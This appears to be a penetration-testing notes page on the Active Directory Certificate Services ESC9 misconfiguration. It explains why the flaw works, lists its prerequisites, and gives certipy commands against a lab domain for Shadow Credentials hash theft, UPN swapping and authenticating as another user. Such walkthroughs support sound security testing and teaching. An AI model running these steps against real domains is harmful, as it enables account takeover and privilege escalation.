## ESC9 
#### Understanding ESC9 & Certificate Mapping 
A key aspect to grasp is that if the `msPKI-Enrollment-Flag` attribute of a certificate template contains the `CT_FLAG_NO_SECURITY_EXTENSION` flag, it effectively negates the embedding of the `szOID_NTDS_CA_SECURITY_EXT` security extension. This means that irrespective of the configuration of the `StrongCertificateBindingEnforcement` registry key (even if set to its default value of 1), the mapping process will occur as if the registry key had a value of 0, essentially bypassing strong certificate mapping.
Consequently, this loophole can be exploited if we possess sufficient privileges to access and modify a user account's `User Principal Name (UPN),` aligning it with the UPN of another account. By leveraging this manipulated configuration, we can request a certificate for the user using their legitimate credentials. Remarkably, the obtained certificate will be seamlessly mapped to the other account, which is the ultimate target.

#### ESC9 Abuse Requirements
To successfully abouse this misconfiguration, specific prerequisites must be met:
* The `StrongCertificateBindingEnforcement` registry key should not be set to 2 (by default, it is set to 1), or the `CertificateMappingMethods` should contain the UPN flag (0x4). Regrettably, as a low-privileged user, accessing and reading the values of these registry keys is typically unattainable.
* The certificate template must incorporate the `CT_FLAG_NO_SECURITY_EXTENSION` flag within the `msPKI-Enrollment-Flag` value.
* The certificate template should explicitly specify client authentication as its purpose.
* The attacker must possess at least the `GenericWrite` privilege against any user account (account A) to compromise the security of any other user account (account B).

#### ESC9 Attack from Linux
With our FullControl rights over user2, we can utilize those privileges to either reset or add an extra password for user2. We can accomplish this using Password Reset or Shadow Credentials. The advantage of using Shadow Credentials is that we do not have to affect the user by changing their password.

Retrieve user2 NT hash via Shadow Credentials
```bash
certipy shadow auto -u 'BlWasp@lab.local' -p 'Password123!' -account user2
```
We can modify the UPN of user2 to match our target account's UPN of user3.
```bash
certipy account update -u 'BlWasp@lab.local' -p 'Password123!' -user user2 -upn user3@lab.local
```

Using the credentials of user2, we request a certificate from the template vulnerable to ESC9.
```bash
certipy req -u 'user2@lab.local' -hashes 2b576acbe6bcfda7294d6bd18041b8fe -ca lab-LAB-DC-CA -template ESC9
```

revert changes of user2
```bash
certipy account update -u 'BlWasp@lab.local' -p 'Password123!' -user user2 -upn user2@lab.local
```
authenticate as user3 using our obtained certificate.
```bash
certipy auth -pfx user3.pfx -domain lab.local
```

